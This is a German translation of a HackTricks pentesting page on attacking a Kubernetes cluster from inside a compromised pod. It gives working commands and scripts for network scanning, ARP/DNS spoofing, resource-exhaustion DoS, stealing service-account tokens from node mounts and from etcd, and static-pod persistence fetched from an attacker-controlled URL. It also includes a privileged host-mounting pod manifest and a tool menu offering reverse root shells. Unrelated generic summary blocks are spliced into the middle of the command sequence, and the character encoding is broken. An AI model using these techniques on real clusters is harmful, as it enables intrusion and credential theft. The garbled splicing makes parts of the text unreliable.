# Angriff auf Kubernetes von innerhalb eines Pods

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## **Pod Ausbruch**

**Wenn Sie Gl√ºck haben, k√∂nnten Sie in der Lage sein, daraus zu entkommen und zum Knoten zu gelangen:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Ausbruch aus dem Pod

Um aus den Pods zu entkommen, m√ºssen Sie m√∂glicherweise zuerst **Berechtigungen eskalieren**, einige Techniken dazu:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Sie k√∂nnen diese **Docker-Ausbr√ºche √ºberpr√ºfen, um zu versuchen zu entkommen**, aus einem Pod, den Sie kompromittiert haben:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Ausnutzen von Kubernetes-Berechtigungen

Wie im Abschnitt √ºber **Kubernetes-Enumeration** erkl√§rt:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Werden die Pods normalerweise mit einem **Service Account Token** darin ausgef√ºhrt. Dieser Service-Account kann einige **Berechtigungen haben**, die Sie **ausnutzen** k√∂nnten, um zu anderen Pods zu **wechseln** oder sogar zu den Knoten zu **entkommen**, die im Cluster konfiguriert sind. Sehen Sie, wie das geht in:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Ausnutzen von Cloud-Berechtigungen

Wenn der Pod in einer **Cloud-Umgebung** ausgef√ºhrt wird, k√∂nnten Sie in der Lage sein, ein **Token vom Metadaten-Endpunkt zu leaken** und Berechtigungen damit zu eskalieren.

## Suche nach anf√§lligen Netzwerkdiensten

Da Sie sich in der Kubernetes-Umgebung befinden, sollten Sie, wenn Sie die Berechtigungen der aktuellen Pods nicht missbrauchen k√∂nnen und nicht aus dem Container entkommen k√∂nnen, nach potenziell anf√§lligen Diensten suchen.

### Dienste

**Zu diesem Zweck k√∂nnen Sie versuchen, alle Dienste der Kubernetes-Umgebung zu erhalten:**
```
kubectl get svc --all-namespaces
```
Standardm√§√üig verwendet Kubernetes ein flaches Netzwerkschema, was bedeutet, dass **jedes Pod/Service innerhalb des Clusters miteinander kommunizieren kann**. Die **Namespaces** innerhalb des Clusters **haben standardm√§√üig keine Netzwerksicherheitsbeschr√§nkungen**. Jeder im Namespace kann mit anderen Namespaces kommunizieren.

### Scannen

Das folgende Bash-Skript (entnommen aus einem [Kubernetes-Workshop](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) installiert und scannt die IP-Bereiche des Kubernetes-Clusters:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Check out the following page to learn how you could **attack Kubernetes specific services** to **compromise other pods/all the environment**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Sniffing

In case the **compromised pod is running some sensitive service** where other pods need to authenticate you might be able to obtain the credentials send from the other pods **sniffing local communications**.

## Netzwerk-Spoofing

Standardm√§√üig funktionieren Techniken wie **ARP-Spoofing** (und dank dessen **DNS-Spoofing**) im Kubernetes-Netzwerk. Dann, innerhalb eines Pods, wenn Sie die **NET\_RAW-F√§higkeit** haben (die standardm√§√üig vorhanden ist), k√∂nnen Sie benutzerdefinierte Netzwerkpakete senden und **MitM-Angriffe √ºber ARP-Spoofing auf alle Pods durchf√ºhren, die auf demselben Knoten ausgef√ºhrt werden.**\
Dar√ºber hinaus, wenn der **b√∂sartige Pod** auf dem **gleichen Knoten wie der DNS-Server** l√§uft, k√∂nnen Sie einen **DNS-Spoofing-Angriff auf alle Pods im Cluster** durchf√ºhren.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

Es gibt keine Spezifikation von Ressourcen in den Kubernetes-Manifesten und **keine angewendeten Grenzen f√ºr die Container.** Als Angreifer k√∂nnen wir **alle Ressourcen verbrauchen, auf denen der Pod/Deployment l√§uft,** und andere Ressourcen verhungern lassen und eine DoS f√ºr die Umgebung verursachen.

Dies kann mit einem Tool wie [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng) durchgef√ºhrt werden:
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Du kannst den Unterschied sehen, w√§hrend `stress-ng` l√§uft und danach.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Knoten Post-Exploitation

Wenn es Ihnen gelungen ist, **aus dem Container auszubrechen**, finden Sie einige interessante Dinge im Knoten:

- Der **Container-Runtime**-Prozess (Docker)
- Weitere **Pods/Container**, die auf dem Knoten ausgef√ºhrt werden und die Sie missbrauchen k√∂nnen (mehr Tokens)
- Das gesamte **Dateisystem** und das **Betriebssystem** im Allgemeinen
- Der **Kube-Proxy**-Dienst lauscht
- Der **Kubelet**-Dienst lauscht. √úberpr√ºfen Sie Konfigurationsdateien:
  - Verzeichnis: `/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- Andere **√ºbliche Kubernetes-Dateien**:
  - `$HOME/.kube/config` - **Benutzerkonfiguration**
  - `/etc/kubernetes/kubelet.conf`- **Regul√§re Konfiguration**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **Bootstrap-Konfiguration**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcd-Konfiguration**
  - `/etc/kubernetes/pki` - **Kubernetes-Schl√ºssel**

### Knoten kubeconfig finden

Wenn Sie die kubeconfig-Datei nicht in einem der zuvor kommentierten Pfade finden k√∂nnen, **√ºberpr√ºfen Sie das Argument `--kubeconfig` des Kubelet-Prozesses**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Geheimnisse stehlen
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Das Skript [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) wird automatisch die **Token anderer Pods abrufen und √ºberpr√ºfen, ob sie die gesuchte Berechtigung haben** (anstatt dass Sie jeden einzelnen manuell √ºberpr√ºfen m√ºssen):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privileged DaemonSets

Ein DaemonSet ist ein **Pod**, der in **allen Nodes des Clusters ausgef√ºhrt wird**. Wenn ein DaemonSet mit einem **privilegierten Service Account** konfiguriert ist, kannst du in **ALLEN Nodes** das **Token** dieses **privilegierten Service Accounts** finden, das du missbrauchen k√∂nntest.

Der Exploit ist derselbe wie im vorherigen Abschnitt, aber jetzt bist du nicht mehr vom Gl√ºck abh√§ngig.

### Pivot to Cloud

Wenn der Cluster von einem Cloud-Dienst verwaltet wird, hat der **Node in der Regel einen anderen Zugriff auf das Metadaten-Endpunkt** als der Pod. Versuche daher, **vom Node aus auf den Metadaten-Endpunkt zuzugreifen** (oder von einem Pod mit hostNetwork auf True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Steal etcd

Wenn du den [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) des Nodes angeben kannst, auf dem der Container ausgef√ºhrt wird, erhalte eine Shell innerhalb eines Steuerungsebenen-Nodes und hole dir die **etcd-Datenbank**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane-Knoten haben die **Rolle Master** und in **cloud-managed Clustern k√∂nnen Sie darin nichts ausf√ºhren**.

#### Secrets aus etcd lesen

Wenn Sie Ihren Pod auf einem control-plane-Knoten mit dem `nodeName`-Selektor in der Pod-Spezifikation ausf√ºhren k√∂nnen, haben Sie m√∂glicherweise einfachen Zugriff auf die `etcd`-Datenbank, die alle Konfigurationen f√ºr den Cluster enth√§lt, einschlie√ülich aller Secrets.

Nachfolgend finden Sie eine schnelle und einfache M√∂glichkeit, Secrets aus `etcd` abzurufen, wenn es auf dem control-plane-Knoten l√§uft, auf dem Sie sich befinden. Wenn Sie eine elegantere L√∂sung w√ºnschen, die einen Pod mit dem `etcd`-Client-Dienstprogramm `etcdctl` startet und die Anmeldeinformationen des control-plane-Knotens verwendet, um eine Verbindung zu `etcd` herzustellen, egal wo es ausgef√ºhrt wird, werfen Sie einen Blick auf [dieses Beispielmanifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) von @mauilion.

**√úberpr√ºfen Sie, ob `etcd` auf dem control-plane-Knoten ausgef√ºhrt wird, und sehen Sie, wo sich die Datenbank befindet (Dies ist in einem mit `kubeadm` erstellten Cluster)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
# Angriff auf Kubernetes von innerhalb eines Pods

In vielen Szenarien ist es m√∂glich, dass ein Angreifer von innerhalb eines Pods aus agiert. Dies kann aufgrund von Schwachstellen in der Anwendung oder durch Kompromittierung des Pods selbst geschehen. Einmal innerhalb eines Pods, kann ein Angreifer versuchen, sich innerhalb des Kubernetes-Clusters zu bewegen und weitere Angriffe durchzuf√ºhren.

## M√∂gliche Angriffsszenarien von innerhalb eines Pods

### 1. Pod-Eskalation

Ein Angreifer kann versuchen, Berechtigungen innerhalb des Pods zu eskalieren, um mehr Kontrolle zu erlangen. Dies kann durch Ausnutzen von Schwachstellen in der Konfiguration des Pods oder der Anwendung erreicht werden.

### 2. Netzwerk-Sniffing

Durch das Abh√∂ren des Netzwerkverkehrs innerhalb des Pods kann ein Angreifer sensible Informationen wie Zugangsdaten oder andere vertrauliche Daten stehlen.

### 3. Angriffe auf die Kubernetes-API

Einmal innerhalb eines Pods kann ein Angreifer versuchen, die Kubernetes-API anzugreifen, um z. B. Ressourcen im Cluster zu manipulieren oder sensible Informationen abzurufen.

## Empfohlene Ma√ünahmen

- Regelm√§√üige √úberpr√ºfung und Aktualisierung der Pod-Konfiguration, um potenzielle Schwachstellen zu identifizieren und zu beheben.
- Einsatz von Netzwerkrichtlinien und Verschl√ºsselung, um das Risiko von Netzwerk-Sniffing zu verringern.
- Beschr√§nkung der Zugriffsrechte innerhalb des Pods, um die Auswirkungen einer Pod-Eskalation zu minimieren.
- √úberwachung der Kubernetes-API-Aufrufe, um verd√§chtige Aktivit√§ten zu erkennen und darauf zu reagieren.
```
```bash
data-dir=/var/lib/etcd
```
**Zeigen Sie die Daten in der etcd-Datenbank an:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Extrahiere die Tokens aus der Datenbank und zeige den Namen des Service-Accounts an**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Derselbe Befehl, aber einige Greps, um nur das Standard-Token im kube-system-Namespace zur√ºckzugeben**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
# Angriff auf Kubernetes von innerhalb eines Pods

Wenn ein Angreifer Zugriff auf ein Kubernetes-Pod erh√§lt, kann er verschiedene Angriffstechniken nutzen, um das Kubernetes-Cluster zu kompromittieren. Hier sind einige m√∂gliche Angriffsszenarien:

1. **Pod-Flucht**: Der Angreifer versucht, aus dem Pod auszubrechen und auf andere Pods zuzugreifen.
   
2. **Pod-Spoofing**: Der Angreifer erstellt einen b√∂sartigen Pod, der sich als legitimer Pod ausgibt, um sensible Informationen abzufangen.
   
3. **Pod-Manipulation**: Der Angreifer √§ndert die Konfiguration des Pods, um die Integrit√§t des Clusters zu gef√§hrden.
   
4. **Pod-Netzwerk-Sniffing**: Der Angreifer √ºberwacht den Netzwerkverkehr innerhalb des Clusters, um vertrauliche Daten abzufangen.

Es ist wichtig, Sicherheitsvorkehrungen zu treffen, um solche Angriffe zu verhindern, z. B. die Verwendung von Network Policies, RBAC und regelm√§√üige Sicherheitsaudits.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Statische/gespiegelte Pods Persistenz

_Statische Pods_ werden direkt vom kubelet-Daemon auf einem bestimmten Knoten verwaltet, ohne dass der API-Server sie beobachtet. Im Gegensatz zu Pods, die vom Steuerungsebene verwaltet werden (zum Beispiel, ein Deployment); stattdessen **√ºberwacht der kubelet jeden statischen Pod** (und startet ihn neu, wenn er fehlschl√§gt).

Daher sind statische Pods immer **an ein Kubelet** auf einem bestimmten Knoten gebunden.

Der **kubelet versucht automatisch, f√ºr jeden statischen Pod einen Spiegelpod auf dem Kubernetes-API-Server zu erstellen**. Dies bedeutet, dass die auf einem Knoten ausgef√ºhrten Pods auf dem API-Server sichtbar sind, aber nicht von dort aus gesteuert werden k√∂nnen. Die Pod-Namen werden mit dem Knoten-Hostname mit einem f√ºhrenden Bindestrich versehen.

{% hint style="danger" %}
Die **`spec` eines statischen Pods kann nicht auf andere API-Objekte verweisen** (z. B. ServiceAccount, ConfigMap, Secret, usw.). Daher **k√∂nnen Sie dieses Verhalten nicht missbrauchen, um einen Pod mit einem beliebigen ServiceAccount** im aktuellen Knoten zu starten, um den Cluster zu kompromittieren. Aber Sie k√∂nnten dies verwenden, um Pods in verschiedenen Namespaces auszuf√ºhren (falls das aus irgendeinem Grund n√ºtzlich ist).
{% endhint %}

Wenn Sie sich im Knotenhost befinden, k√∂nnen Sie ihn dazu bringen, einen **statischen Pod innerhalb sich selbst zu erstellen**. Dies ist ziemlich n√ºtzlich, da es Ihnen erm√∂glichen k√∂nnte, einen Pod in einem anderen Namespace wie **kube-system** zu erstellen.

Um einen statischen Pod zu erstellen, sind die [**Dokumente eine gro√üe Hilfe**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Sie ben√∂tigen im Grunde genommen 2 Dinge:

* Konfigurieren Sie den Parameter **`--pod-manifest-path=/etc/kubernetes/manifests`** im **kubelet-Dienst** oder in der **kubelet-Konfiguration** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) und starten Sie den Dienst neu
* Erstellen Sie die Definition im **Pod-Definition** im Verzeichnis **`/etc/kubernetes/manifests`**

**Ein weiterer unauff√§lligerer Weg w√§re:**

* √Ñndern Sie den Parameter **`staticPodURL`** in der **kubelet**-Konfigurationsdatei und setzen Sie etwas wie `staticPodURL: http://attacker.com:8765/pod.yaml`. Dadurch wird der kubelet-Prozess einen **statischen Pod erstellen, der die Konfiguration von der angegebenen URL** abruft.

**Beispiel** einer **Pod**-Konfiguration zur Erstellung eines privilegierten Pods in **kube-system** entnommen von [**hier**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### L√∂schen von Pods + nicht planbare Knoten

Wenn ein Angreifer **einen Knoten kompromittiert** hat und er **Pods von anderen Knoten l√∂schen** und **andere Knoten daran hindern kann, Pods auszuf√ºhren**, werden die Pods auf dem kompromittierten Knoten erneut gestartet und er wird in der Lage sein, **die Tokens zu stehlen**, die in ihnen ausgef√ºhrt werden.\
F√ºr [**weitere Informationen folgen Sie diesen Links**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Automatische Tools

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
